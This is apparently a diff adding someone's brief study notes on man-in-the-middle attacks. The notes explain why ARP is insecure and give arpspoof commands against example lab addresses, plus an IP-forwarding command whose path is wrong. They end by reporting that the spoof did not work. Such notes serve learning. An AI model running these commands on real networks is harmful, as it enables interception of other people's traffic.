@@ -1,0 +1,30 @@
+MITM
+-----------------------------
+ARP protocol
+arp -a
+==> ARP is not secure
+ARP Spoofing and its causes:-
+	-Clients accept responses even if they did not send a request
+	-Clients trust response without any form of verification
+
+USing ARPSpoof[A tool]
+--------------------------
+You can only use this tool to redirect thr flow of data and make it flow through your computer
+simple and reliable
+ported to most OS including Android and ios
+Usage is same
+
+arpspoof -i [Interface] -t [Gateway IP] [Target IP] 
+ 
+For ex:
+
+arpspoof -i eth0 -t 10.0.2.15 10.0.2.1
+
+arpspoof -i eth0 -t 10.0.2.1 10.0.2.15
+
+
+To set the port Forwarding:-
+echo 1 > /proc/sys/ipv4/ip_forward
+===============================================
+
+conclusion:= Though everything went fine but after arpspoof the Mac add of the default gateway was not changing
